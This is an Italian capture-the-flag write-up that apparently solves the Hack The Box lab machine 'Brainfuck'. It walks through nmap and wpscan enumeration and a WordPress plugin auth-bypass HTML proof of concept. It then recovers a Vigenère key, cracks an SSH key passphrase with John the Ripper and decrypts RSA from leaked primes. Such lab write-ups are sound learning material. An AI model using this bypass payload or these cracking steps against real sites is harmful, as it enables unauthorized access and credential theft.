# Brainfuck

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap per conoscere le porte aperte e i servizi che girano su di esse.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.17
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Le porte aperte sono le seguenti:

* **Porta 22:** OpenSSH 7.2p2
* **Porta 25** smtp Postfix smtpd
* **Porta 110** pop3 Dovecot pop3d
* **Porta 143** imap Dovecot imapd
* **Porta 443** ssl/http nginx 1.10.0

```text
Nmap scan report for 10.10.10.17
Host is up (0.076s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA PIPELINING RESP-CODES UIDL SASL(PLAIN) AUTH-RESP-CODE USER TOP
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: OK AUTH=PLAINA0001 Pre-login LITERAL+ ENABLE IMAP4rev1 more listed capabilities SASL-IR have post-login ID LOGIN-REFERRALS IDLE
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
| tls-nextprotoneg:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.8 - 3.11 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ho aggiunto al file /etc/hosts/ i tre possibili hostname:
  * brainfuck.htb
  * www.brainfuck.htb
  * sup3rs3cr3t.brainfuck.htb

## Enumeration

In questa fase cerco di capire se qualcuno di questi servizi è configurato in modo errato o se presenta vulnerabilità note.

### 1) Porta 22 OpenSSH 7.2p2

La vulnerabilità trovata:
  * OpenSSH 2.3 < 7.7 - Username Enumeration

Questa vulnerabilità ci permette di fare username enumeration. Quindi scarico lo scpript da qui [CVE-2018-15473](https://github.com/Sait-Nuri/CVE-2018-15473) e lo eseguo passandogli una lista di username.

<p align="center">
  <img src="/Immagini/Linux-Box/Brainfuck/brainfuck-2.png" />
</p>

Nel frattempo che lo script esegue in background proseguo con gli altri servizi.

### 2) Porta 443 nginx 1.10.0

Per prima cosa visito il sito brainfuck.htb.

<p align="center">
  <img src="/Immagini/Linux-Box/Brainfuck/brainfuck-1.png" />
</p>

Questo è un sito WordPress e quindi ci sono delle vulnerabilità! Prima di lanciare uno scanner, provo a scovare qualche informazione utile nel certificato del sito e trovo questo indirizzo email:

<p align="center">
  <img src="/Immagini/Linux-Box/Brainfuck/brainfuck-3.png" />
</p>

Questo può essere utile successivamente.

Ora avvio lo scanner:

```text
wpscan --url https://brainfuck.htb --disable-tls-checks
```
 * — url: The URL of the blog to scan
 * — disable-tls-checks: Disables SSL/TLS certificate verification

Dalla scansione appena effettuata si evince che:
 * La versione di WordPress è la 4.7.3
 * Il plugin wp-support-plus-responsive-ticket-system contiene diverse vulnerabilità

Proseguo con una ricerca tramite searchsploit:

<p align="center">
  <img src="/Immagini/Linux-Box/Brainfuck/brainfuck-4.png" />
</p>

Cerco di sfruttare la seconda vulnerabilità della lista che mi consentirebbe di autenticarmi anche non conoscendo la password. Per testare questa vulnerabilità occorre conscrere un username valido:

```text
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
```

Il risultato della scansione è il seguente:

```text
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

## Exploitation

### 1) [Vulnerabilità EDB-ID: 41006](https://www.exploit-db.com/exploits/41006)

Creo un file html (priv-esc.html) recuperando il POC da exploit-db e modifico l'URL con quello della macchina da attaccare:

```text
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

Apro il file nel browser ed effettuo il login come admin.

<p align="center">
  <img src="/Immagini/Linux-Box/Brainfuck/brainfuck-5.png" />
</p>

Ora vado su _Brainfuck Ltd. > Themes > Settings > Easy WP SMTP_. Ispezionando la sorgente della pagina trovo la password dell'utente orestis in chiaro:

<p align="center">
  <img src="/Immagini/Linux-Box/Brainfuck/brainfuck-6.png" />
</p>

### 2) Accesso all'email dell'utente orestis

Ho usato [evolution](https://wiki.gnome.org/Apps/Evolution) come email client e una volta eseguito l'accesso, con le credenziali trovate precedentemente, ho trovato questa email:

<p align="center">
  <img src="/Immagini/Linux-Box/Brainfuck/brainfuck-7.png" />
</p>

### 3) Accesso al sito https://sup3rs3cr3t.brainfuck.htb

Dando un rapido sguardo al forum ci si accorge subito che che l'utente orestis ha perso la sua chiave SSH e per questo ha richiesto all'admin di inviargliela in forma criptata. Fortunatamente, il nostro amico orestis ha questa simpatica abitudine di utilizzare come firma dei suoi messaggi la frase "Orestis — Hacking for fun and profit".

<p align="center">
  <img src="/Immagini/Linux-Box/Brainfuck/brainfuck-8.png" />
</p>

Nel thred criptato possiamo notare che la firma di orestis è diversa in ogni suo commento. Per questo motivo l'admin potrebbe aver utilizzato il [Cifrario di Vigenère](https://it.wikipedia.org/wiki/Cifrario_di_Vigen%C3%A8re), una generalizzazione del [Cifrario di Cesare](https://it.wikipedia.org/wiki/Cifrario_di_Cesare); invece di spostare sempre dello stesso numero di posti la lettera da cifrare, questa viene spostata di un numero di posti variabile ma ripetuto, determinato in base ad una parola chiave.

<p align="center">
  <img src="/Immagini/Linux-Box/Brainfuck/brainfuck-9.png" />
</p>

Siccome ho ottenuto sia il plaintext che il chipertext, posso dedurre la chiave utilizzando questo script in python gentilmente offerto dal signor ChatGPT:

```text
def vigenere_decrypt(ciphertext, key):
    decrypted_text = ""
    key_length = len(key)

    for i in range(len(ciphertext)):
        char = ciphertext[i]
        key_char = key[i % key_length]

        # Decifra il carattere utilizzando il cifrario di Vigenère
        decrypted_char = chr(((ord(char) - ord(key_char)) % 26) + ord('A'))

        decrypted_text += decrypted_char

    return decrypted_text

plaintext = "OrestisHackingforfunandprofit"
ciphertext = "PieagnmJkoijegnbwzwxmlegrwsnn"

# Trova la chiave
key = ""
for i in range(len(plaintext)):
    key_char = chr(((ord(ciphertext[i]) - ord(plaintext[i])) % 26) + ord('A'))
    key += key_char

print("Chiave trovata:", key)

# Decifra il testo cifrato utilizzando la chiave trovata
decrypted_text = vigenere_decrypt(ciphertext, key)
print("Testo decifrato:", decrypted_text)

```

Il risultato ottenuto è il seguente:

```text
BRAINFUCKMYBRAINFUCKMYBRAINFU
```

Siccome il cifrario usa una parola e la ripete sulla base della lunghezza del plaintext, è possibile dedurre che la chiave sia _fuckmybrain_.

Utilizzando un semplice  [tool](https://www.boxentriq.com/code-breaking/vigenere-cipher) online è possibile decifrare il contenuto dei commenti del forum; quello più interessante è di sicuro il seguente:

```text
There you go you stupid fuck, I hope you remember your key password because I dont :)
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

Da questo link si ottenere la chiave RSA dell'utente orestis.

### 4) SSH Brute-Force

Prima di utilizzare John the Ripper per tentare di eseguire il crack della password, converto il l'RSA nel formato adatto utilizzando lo script ssh2jhon.py

```text
python /usr/share/ssh2john.py id_rsa > ssh-key
```

Successivamente, proseguo con il crack della password:

```text
john ssh-key --wordlist=/usr/share/wordlists/rockyou.txt
```

Il risultato ottenuto è il seguente:

```text
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (/root/Desktop/htb/brainfuck/id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:12 DONE (2019-12-26 16:53) 0.08223g/s 1179Kp/s 1179Kc/s 1179KC/sa6_123..*7¡Vamos!
Session completed
```

**Una volta ottenuta la password, cambio i permessi all'RSA:

```text
chmod 600 id_rsa
```

E mi collego in ssh alla macchina:

```text
ssh -i id_rsa orestis@brainfuck.htb
```

<p align="center">
  <img src="/Immagini/Linux-Box/Brainfuck/brainfuck-10.png" />
</p>

**Ho ottenuto il primo flag user.txt!**


## Privilege Escalation

Nella home directory di orestis salta subito all'occhio il file _encrypt.sage_:

```text
nbits = 1024password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

Sembra che stia eseguendo una crittografia RSA. Innanzitutto utilizza il valore del file root.txt come parametro nella crittografia. La password crittografata viene scritta nel file output.txt e i parametri vengono registrati nel file debug.txt. Quest'ultimo è accessibile in modalità e quindi si può risalire ai valori di p e q. Inoltre, all'interno del file output.txt è presente anche il valore di c.

Siccome ho molta voglia di fare questo calcolo, scrivo a ChatGPT. Lo script generato dal mio amico è il seguente:

```text
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y
def main():
	p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
	q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
	e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
	ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
	n = p * q# Compute phi(n)
	phi = (p - 1) * (q - 1)
	gcd, a, b = egcd(e, phi)
	d = a
	print( "n:  " + str(d) );
	pt = pow(ct, d, n)
	print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```

**Eseguendolo ottengo il contenuto di root.txt**
